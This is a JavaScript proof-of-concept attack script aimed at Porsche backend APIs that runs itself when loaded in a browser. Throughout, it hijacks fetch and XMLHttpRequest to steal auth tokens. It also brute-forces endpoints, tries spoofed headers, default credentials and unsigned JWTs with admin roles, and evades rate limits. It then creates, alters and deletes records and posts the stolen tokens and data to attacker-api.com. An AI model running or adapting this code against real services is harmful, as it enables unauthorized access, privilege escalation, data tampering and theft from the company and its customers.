/**
 * PoC Script 6: API Security Bypass
 * Target: Porsche backend APIs and microservices
 * Entry Point: Token manipulation + API endpoint discovery
 * Impact: Unauthorized API access, data manipulation, privilege escalation
 */

class APISecurityBypassPoC {
    constructor() {
        this.attackId = 'API_BYPASS_' + Date.now();
        this.apiDataEndpoint = 'https://attacker-api.com/api-data';
        this.discoveredAPIs = [];
        this.bypassedEndpoints = [];
        this.stolenAPIData = [];
        this.apiTokens = new Map();
        this.rateLimitBypasses = [];
    }

    /**
     * Phase 1: API Discovery and Enumeration
     */
    async discoverAPIs() {
        console.log('[API ATTACK] Phase 1: API discovery and enumeration');

        // Discover APIs from JavaScript code
        await this.extractAPIsFromJavaScript();

        // Discover APIs from network requests
        this.interceptNetworkRequests();

        // Brute force common API endpoints
        await this.bruteForceAPIEndpoints();

        // Analyze API documentation endpoints
        await this.discoverAPIDocumentation();

        console.log(`[API ATTACK] Discovered ${this.discoveredAPIs.length} API endpoints`);
    }

    /**
     * Extract API endpoints from JavaScript code
     */
    async extractAPIsFromJavaScript() {
        console.log('[API ATTACK] Extracting APIs from JavaScript');

        // Common API patterns to search for
        const apiPatterns = [
            /\/api\/[a-zA-Z0-9\/_-]+/g,
            /\/v[0-9]+\/[a-zA-Z0-9\/_-]+/g,
            /\/rest\/[a-zA-Z0-9\/_-]+/g,
            /\/graphql/g,
            /\/webhook\/[a-zA-Z0-9\/_-]+/g,
            /https?:\/\/[^\/]+\/api\/[a-zA-Z0-9\/_-]+/g
        ];

        // Search in all script tags
        const scripts = document.querySelectorAll('script');
        
        scripts.forEach(script => {
            const content = script.innerHTML || script.textContent;
            if (content) {
                apiPatterns.forEach(pattern => {
                    const matches = content.match(pattern);
                    if (matches) {
                        matches.forEach(match => {
                            this.addDiscoveredAPI(match, 'javascript_extraction');
                        });
                    }
                });
            }
        });

        // Search in external script files
        const externalScripts = Array.from(document.querySelectorAll('script[src]'));
        for (const script of externalScripts) {
            try {
                const response = await fetch(script.src);
                const content = await response.text();
                
                apiPatterns.forEach(pattern => {
                    const matches = content.match(pattern);
                    if (matches) {
                        matches.forEach(match => {
                            this.addDiscoveredAPI(match, 'external_script');
                        });
                    }
                });
            } catch (e) {
                // Script might not be accessible due to CORS
            }
        }
    }

    /**
     * Add discovered API to collection
     */
    addDiscoveredAPI(endpoint, source) {
        // Normalize endpoint
        let normalizedEndpoint = endpoint;
        if (!endpoint.startsWith('http')) {
            normalizedEndpoint = window.location.origin + endpoint;
        }

        // Check if already discovered
        const existing = this.discoveredAPIs.find(api => api.endpoint === normalizedEndpoint);
        if (!existing) {
            this.discoveredAPIs.push({
                endpoint: normalizedEndpoint,
                source: source,
                methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
                discovered_at: Date.now()
            });
            console.log(`[API ATTACK] New API discovered: ${normalizedEndpoint}`);
        }
    }

    /**
     * Intercept network requests to discover APIs
     */
    interceptNetworkRequests() {
        console.log('[API ATTACK] Intercepting network requests');

        const originalFetch = window.fetch;
        const self = this;

        window.fetch = function(...args) {
            const [url, options] = args;
            
            // Log API requests
            if (self.isAPIEndpoint(url)) {
                self.addDiscoveredAPI(url, 'network_interception');
                
                // Extract authentication tokens
                if (options && options.headers) {
                    self.extractAuthTokens(options.headers, url);
                }
            }

            return originalFetch.apply(this, args).then(response => {
                // Analyze API responses
                if (self.isAPIEndpoint(url)) {
                    self.analyzeAPIResponse(url, response.clone());
                }
                return response;
            });
        };

        // Also intercept XMLHttpRequest
        const originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, ...args) {
            if (self.isAPIEndpoint(url)) {
                self.addDiscoveredAPI(url, 'xhr_interception');
            }
            return originalXHROpen.apply(this, [method, url, ...args]);
        };
    }

    /**
     * Check if URL is an API endpoint
     */
    isAPIEndpoint(url) {
        const apiIndicators = [
            '/api/', '/v1/', '/v2/', '/v3/', '/rest/', '/graphql',
            '/webhook/', '/service/', '/microservice/'
        ];
        
        return apiIndicators.some(indicator => url.includes(indicator));
    }

    /**
     * Extract authentication tokens from headers
     */
    extractAuthTokens(headers, url) {
        const authHeaders = ['authorization', 'x-api-key', 'x-auth-token', 'x-access-token'];
        
        authHeaders.forEach(header => {
            const value = headers[header] || headers[header.toLowerCase()];
            if (value) {
                this.apiTokens.set(url, {
                    header: header,
                    value: value,
                    extracted_at: Date.now()
                });
                console.log(`[API ATTACK] Auth token extracted for ${url}`);
            }
        });
    }

    /**
     * Brute force common API endpoints
     */
    async bruteForceAPIEndpoints() {
        console.log('[API ATTACK] Brute forcing API endpoints');

        const baseURL = window.location.origin;
        const commonEndpoints = [
            // Authentication endpoints
            '/api/auth/login', '/api/auth/logout', '/api/auth/refresh',
            '/api/auth/register', '/api/auth/forgot-password',
            
            // User management
            '/api/users', '/api/users/me', '/api/users/profile',
            '/api/customers', '/api/customers/profile',
            
            // Vehicle/Product APIs
            '/api/vehicles', '/api/models', '/api/configurations',
            '/api/inventory', '/api/catalog', '/api/products',
            
            // Financial APIs
            '/api/payments', '/api/billing', '/api/orders',
            '/api/transactions', '/api/invoices',
            
            // Administrative APIs
            '/api/admin', '/api/admin/users', '/api/admin/settings',
            '/api/system', '/api/health', '/api/status',
            
            // Data APIs
            '/api/analytics', '/api/reports', '/api/export',
            '/api/backup', '/api/logs',
            
            // Common versioned endpoints
            '/v1/api', '/v2/api', '/v3/api',
            '/api/v1', '/api/v2', '/api/v3'
        ];

        // Test each endpoint
        for (const endpoint of commonEndpoints) {
            await this.testAPIEndpoint(baseURL + endpoint);
            
            // Add delay to avoid rate limiting
            await this.sleep(100);
        }
    }

    /**
     * Test API endpoint for accessibility
     */
    async testAPIEndpoint(url) {
        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'];
        
        for (const method of methods) {
            try {
                const response = await fetch(url, {
                    method: method,
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    }
                });

                if (response.status !== 404) {
                    this.addDiscoveredAPI(url, 'brute_force');
                    
                    // Analyze response for sensitive information
                    await this.analyzeAPIResponse(url, response.clone());
                    
                    console.log(`[API ATTACK] Accessible endpoint found: ${method} ${url} (${response.status})`);
                    break; // Found accessible endpoint, no need to test other methods
                }
            } catch (e) {
                // Endpoint might not exist or network error
            }
        }
    }

    /**
     * Analyze API response for sensitive data
     */
    async analyzeAPIResponse(url, response) {
        try {
            const responseText = await response.text();
            
            // Look for sensitive data patterns
            const sensitivePatterns = {
                apiKeys: /[a-zA-Z0-9]{32,}/g,
                emails: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g,
                tokens: /[a-zA-Z0-9._-]{20,}/g,
                passwords: /"password":\s*"[^"]+"/g,
                secrets: /"secret":\s*"[^"]+"/g,
                keys: /"key":\s*"[^"]+"/g
            };

            const foundSensitiveData = {};
            Object.entries(sensitivePatterns).forEach(([type, pattern]) => {
                const matches = responseText.match(pattern);
                if (matches) {
                    foundSensitiveData[type] = matches.slice(0, 5); // Limit to first 5 matches
                }
            });

            if (Object.keys(foundSensitiveData).length > 0) {
                console.log(`[API ATTACK] Sensitive data found in ${url}:`, foundSensitiveData);
                this.stolenAPIData.push({
                    url: url,
                    sensitive_data: foundSensitiveData,
                    response_snippet: responseText.substring(0, 500),
                    timestamp: Date.now()
                });
            }

        } catch (e) {
            // Response might not be text
        }
    }

    /**
     * Phase 2: Authentication Bypass
     */
    async bypassAuthentication() {
        console.log('[API ATTACK] Phase 2: Authentication bypass');

        for (const api of this.discoveredAPIs) {
            await this.testAuthenticationBypass(api);
        }
    }

    /**
     * Test various authentication bypass techniques
     */
    async testAuthenticationBypass(api) {
        console.log(`[API ATTACK] Testing auth bypass for: ${api.endpoint}`);

        const bypassTechniques = [
            // Header manipulation
            () => this.testHeaderManipulation(api),
            
            // Token manipulation
            () => this.testTokenManipulation(api),
            
            // HTTP method override
            () => this.testMethodOverride(api),
            
            // Parameter pollution
            () => this.testParameterPollution(api),
            
            // Path traversal
            () => this.testPathTraversal(api),
            
            // Rate limit bypass
            () => this.testRateLimitBypass(api)
        ];

        for (const technique of bypassTechniques) {
            try {
                await technique();
                await this.sleep(200); // Avoid overwhelming the server
            } catch (e) {
                // Technique failed, continue with next
            }
        }
    }

    /**
     * Test header manipulation bypass
     */
    async testHeaderManipulation(api) {
        const bypassHeaders = [
            // IP spoofing headers
            { 'X-Forwarded-For': '127.0.0.1' },
            { 'X-Real-IP': '127.0.0.1' },
            { 'X-Originating-IP': '127.0.0.1' },
            { 'X-Remote-IP': '127.0.0.1' },
            
            // Admin/internal headers
            { 'X-Admin': 'true' },
            { 'X-Internal': 'true' },
            { 'X-Debug': 'true' },
            { 'X-Test': 'true' },
            
            // Authentication bypass headers
            { 'X-User-ID': '1' },
            { 'X-Role': 'admin' },
            { 'X-Permissions': 'all' },
            
            // HTTP method override
            { 'X-HTTP-Method-Override': 'GET' },
            { 'X-Method-Override': 'GET' }
        ];

        for (const headers of bypassHeaders) {
            try {
                const response = await fetch(api.endpoint, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                        ...headers
                    }
                });

                if (response.status === 200 && response.status !== 401 && response.status !== 403) {
                    console.log(`[API ATTACK] Header bypass successful: ${api.endpoint}`, headers);
                    this.bypassedEndpoints.push({
                        endpoint: api.endpoint,
                        bypass_method: 'header_manipulation',
                        headers: headers,
                        status: response.status,
                        timestamp: Date.now()
                    });
                    
                    // Analyze successful response
                    await this.analyzeAPIResponse(api.endpoint, response.clone());
                }
            } catch (e) {
                // Request failed
            }
        }
    }

    /**
     * Test token manipulation bypass
     */
    async testTokenManipulation(api) {
        // Get existing token for this API if available
        const existingToken = this.apiTokens.get(api.endpoint);
        
        if (!existingToken) {
            // Try with common token patterns
            const commonTokens = [
                'Bearer admin',
                'Bearer test',
                'Bearer 123456',
                'Bearer null',
                'Bearer undefined',
                'Basic YWRtaW46YWRtaW4=', // admin:admin
                'Basic dGVzdDp0ZXN0', // test:test
            ];

            for (const token of commonTokens) {
                await this.testWithToken(api, token);
            }
        } else {
            // Manipulate existing token
            await this.manipulateExistingToken(api, existingToken);
        }
    }

    /**
     * Test API with specific token
     */
    async testWithToken(api, token) {
        try {
            const response = await fetch(api.endpoint, {
                method: 'GET',
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }
            });

            if (response.status === 200) {
                console.log(`[API ATTACK] Token bypass successful: ${api.endpoint} with ${token}`);
                this.bypassedEndpoints.push({
                    endpoint: api.endpoint,
                    bypass_method: 'token_manipulation',
                    token: token,
                    status: response.status,
                    timestamp: Date.now()
                });
                
                await this.analyzeAPIResponse(api.endpoint, response.clone());
            }
        } catch (e) {
            // Token test failed
        }
    }

    /**
     * Manipulate existing token for privilege escalation
     */
    async manipulateExistingToken(api, tokenData) {
        const token = tokenData.value;
        
        // If it's a JWT token, try to manipulate it
        if (token.includes('.') && token.split('.').length === 3) {
            await this.manipulateJWTToken(api, token);
        }
        
        // Try token variations
        const tokenVariations = [
            token.replace('user', 'admin'),
            token.replace('customer', 'admin'),
            token + 'admin',
            'admin' + token,
            token.toUpperCase(),
            token.toLowerCase()
        ];

        for (const variation of tokenVariations) {
            await this.testWithToken(api, `Bearer ${variation}`);
        }
    }

    /**
     * Manipulate JWT token for privilege escalation
     */
    async manipulateJWTToken(api, jwtToken) {
        try {
            const parts = jwtToken.split('.');
            const header = JSON.parse(atob(parts[0]));
            const payload = JSON.parse(atob(parts[1]));
            
            // Create manipulated payloads
            const manipulatedPayloads = [
                // Admin privilege escalation
                { ...payload, role: 'admin', roles: ['admin'], permissions: ['*'] },
                { ...payload, isAdmin: true, admin: true },
                { ...payload, sub: 'admin', user: 'admin' },
                
                // Extended expiry
                { ...payload, exp: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60) },
                
                // Remove restrictions
                { ...payload, restrictions: [], limitations: [] }
            ];

            for (const manipulatedPayload of manipulatedPayloads) {
                // Create new JWT (without proper signature - might work if signature not verified)
                const newHeader = btoa(JSON.stringify(header));
                const newPayload = btoa(JSON.stringify(manipulatedPayload));
                const newToken = `${newHeader}.${newPayload}.${parts[2]}`;
                
                await this.testWithToken(api, `Bearer ${newToken}`);
            }

        } catch (e) {
            console.log('[API ATTACK] JWT manipulation failed:', e.message);
        }
    }

    /**
     * Test HTTP method override bypass
     */
    async testMethodOverride(api) {
        const overrideMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
        
        for (const method of overrideMethods) {
            try {
                const response = await fetch(api.endpoint, {
                    method: 'POST', // Use POST but override with header
                    headers: {
                        'X-HTTP-Method-Override': method,
                        'Content-Type': 'application/json'
                    }
                });

                if (response.status === 200) {
                    console.log(`[API ATTACK] Method override bypass: ${api.endpoint} with ${method}`);
                    this.bypassedEndpoints.push({
                        endpoint: api.endpoint,
                        bypass_method: 'method_override',
                        override_method: method,
                        status: response.status,
                        timestamp: Date.now()
                    });
                }
            } catch (e) {
                // Method override failed
            }
        }
    }

    /**
     * Test parameter pollution bypass
     */
    async testParameterPollution(api) {
        const pollutionParams = [
            '?admin=true&admin=false',
            '?user=guest&user=admin',
            '?role=user&role=admin',
            '?debug=false&debug=true',
            '?test=false&test=true'
        ];

        for (const params of pollutionParams) {
            try {
                const response = await fetch(api.endpoint + params, {
                    method: 'GET',
                    headers: { 'Content-Type': 'application/json' }
                });

                if (response.status === 200) {
                    console.log(`[API ATTACK] Parameter pollution bypass: ${api.endpoint}${params}`);
                    this.bypassedEndpoints.push({
                        endpoint: api.endpoint + params,
                        bypass_method: 'parameter_pollution',
                        status: response.status,
                        timestamp: Date.now()
                    });
                }
            } catch (e) {
                // Parameter pollution failed
            }
        }
    }

    /**
     * Test rate limit bypass
     */
    async testRateLimitBypass(api) {
        const bypassTechniques = [
            // IP rotation headers
            { 'X-Forwarded-For': this.generateRandomIP() },
            { 'X-Real-IP': this.generateRandomIP() },
            
            // User agent rotation
            { 'User-Agent': this.generateRandomUserAgent() },
            
            // Session rotation
            { 'X-Session-ID': this.generateRandomString(32) },
            
            // Request ID manipulation
            { 'X-Request-ID': this.generateRandomString(16) }
        ];

        for (const headers of bypassTechniques) {
            try {
                // Make multiple rapid requests to test rate limiting
                const promises = [];
                for (let i = 0; i < 10; i++) {
                    promises.push(fetch(api.endpoint, {
                        method: 'GET',
                        headers: {
                            'Content-Type': 'application/json',
                            ...headers
                        }
                    }));
                }

                const responses = await Promise.all(promises);
                const successfulResponses = responses.filter(r => r.status === 200);

                if (successfulResponses.length > 5) {
                    console.log(`[API ATTACK] Rate limit bypass successful: ${api.endpoint}`);
                    this.rateLimitBypasses.push({
                        endpoint: api.endpoint,
                        bypass_headers: headers,
                        successful_requests: successfulResponses.length,
                        timestamp: Date.now()
                    });
                }
            } catch (e) {
                // Rate limit bypass failed
            }
        }
    }

    /**
     * Phase 3: Data Manipulation and Extraction
     */
    async manipulateAPIData() {
        console.log('[API ATTACK] Phase 3: Data manipulation and extraction');

        for (const bypassedAPI of this.bypassedEndpoints) {
            await this.attemptDataManipulation(bypassedAPI);
        }
    }

    /**
     * Attempt to manipulate data through bypassed API
     */
    async attemptDataManipulation(bypassedAPI) {
        console.log(`[API ATTACK] Attempting data manipulation: ${bypassedAPI.endpoint}`);

        // Try different HTTP methods for data manipulation
        const manipulationMethods = [
            { method: 'POST', data: this.generateTestData('create') },
            { method: 'PUT', data: this.generateTestData('update') },
            { method: 'PATCH', data: this.generateTestData('patch') },
            { method: 'DELETE', data: null }
        ];

        for (const manipulation of manipulationMethods) {
            try {
                const requestOptions = {
                    method: manipulation.method,
                    headers: {
                        'Content-Type': 'application/json',
                        ...this.getBypassHeaders(bypassedAPI)
                    }
                };

                if (manipulation.data) {
                    requestOptions.body = JSON.stringify(manipulation.data);
                }

                const response = await fetch(bypassedAPI.endpoint, requestOptions);

                if (response.status >= 200 && response.status < 300) {
                    console.log(`[API ATTACK] Data manipulation successful: ${manipulation.method} ${bypassedAPI.endpoint}`);
                    
                    const responseData = await response.text();
                    this.stolenAPIData.push({
                        endpoint: bypassedAPI.endpoint,
                        method: manipulation.method,
                        manipulation_data: manipulation.data,
                        response: responseData.substring(0, 1000), // Truncate for logging
                        timestamp: Date.now()
                    });
                }
            } catch (e) {
                // Data manipulation failed
            }
        }
    }

    /**
     * Generate test data for API manipulation
     */
    generateTestData(operation) {
        const baseData = {
            test_field: 'attacker_controlled_value',
            admin: true,
            role: 'admin',
            permissions: ['*'],
            is_test: true,
            created_by: 'api_attacker'
        };

        switch (operation) {
            case 'create':
                return {
                    ...baseData,
                    name: 'Attacker Created Record',
                    description: 'This record was created by an API security test'
                };
            case 'update':
                return {
                    ...baseData,
                    name: 'Attacker Modified Record',
                    modified_by: 'api_attacker'
                };
            case 'patch':
                return {
                    admin: true,
                    role: 'admin'
                };
            default:
                return baseData;
        }
    }

    /**
     * Get bypass headers for API request
     */
    getBypassHeaders(bypassedAPI) {
        const headers = {};
        
        if (bypassedAPI.headers) {
            Object.assign(headers, bypassedAPI.headers);
        }
        
        if (bypassedAPI.token) {
            headers['Authorization'] = bypassedAPI.token;
        }

        return headers;
    }

    /**
     * Utility functions
     */
    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    generateRandomUserAgent() {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ];
        return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    generateRandomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Exfiltrate API data
     */
    async exfiltrateAPIData() {
        const exfiltrationPackage = {
            attack_id: this.attackId,
            discovered_apis: this.discoveredAPIs.length,
            bypassed_endpoints: this.bypassedEndpoints,
            stolen_data: this.stolenAPIData,
            rate_limit_bypasses: this.rateLimitBypasses,
            api_tokens: Array.from(this.apiTokens.entries()),
            timestamp: Date.now()
        };

        try {
            await fetch(this.apiDataEndpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(exfiltrationPackage)
            });
        } catch (e) {
            // Fallback storage
            localStorage.setItem(`api_exfil_${Date.now()}`, JSON.stringify(exfiltrationPackage));
        }
    }

    /**
     * Execute complete API security bypass attack
     */
    async executeAttack() {
        try {
            console.log('[API ATTACK] Starting API security bypass attack...');

            // Phase 1: Discovery
            await this.discoverAPIs();

            // Phase 2: Authentication Bypass
            await this.bypassAuthentication();

            // Phase 3: Data Manipulation
            await this.manipulateAPIData();

            // Exfiltrate results
            await this.exfiltrateAPIData();

            console.log('[API ATTACK] API security bypass completed');
            this.showAPICompromiseImpact();

        } catch (error) {
            console.error('[API ATTACK] Attack failed:', error);
        }
    }

    /**
     * Show API compromise impact
     */
    showAPICompromiseImpact() {
        const impact = {
            discovered_apis: this.discoveredAPIs.length,
            bypassed_endpoints: this.bypassedEndpoints.length,
            stolen_data_points: this.stolenAPIData.length,
            compromised_tokens: this.apiTokens.size,
            rate_limit_bypasses: this.rateLimitBypasses.length,
            attack_capabilities: [
                'Unauthorized API access',
                'Authentication bypass',
                'Data manipulation',
                'Privilege escalation',
                'Rate limit evasion',
                'Token extraction and reuse'
            ]
        };

        console.log('[API ATTACK] API compromise impact:', impact);

        if (typeof document !== 'undefined') {
            const alert = document.createElement('div');
            alert.style.cssText = `
                position: fixed; bottom: 20px; right: 20px; background: #9b59b6;
                color: white; padding: 15px; border-radius: 5px; z-index: 999999;
                font-family: Arial, sans-serif; max-width: 400px;
            `;
            alert.innerHTML = `
                <h3>🔓 API SECURITY BYPASSED</h3>
                <p>Backend APIs compromised!</p>
                <ul>
                    <li>✅ ${this.discoveredAPIs.length} APIs discovered</li>
                    <li>✅ ${this.bypassedEndpoints.length} endpoints bypassed</li>
                    <li>✅ ${this.stolenAPIData.length} data points stolen</li>
                    <li>✅ ${this.apiTokens.size} tokens extracted</li>
                </ul>
                <button onclick="this.remove()" style="margin-top:10px;padding:5px 10px;background:white;color:#9b59b6;border:none;border-radius:3px;">Close</button>
            `;
            document.body.appendChild(alert);
        }
    }
}

// Auto-execute if in browser environment
if (typeof window !== 'undefined') {
    const apiAttack = new APISecurityBypassPoC();
    apiAttack.executeAttack();
}

// Export for manual execution
if (typeof module !== 'undefined' && module.exports) {
    module.exports = APISecurityBypassPoC;
}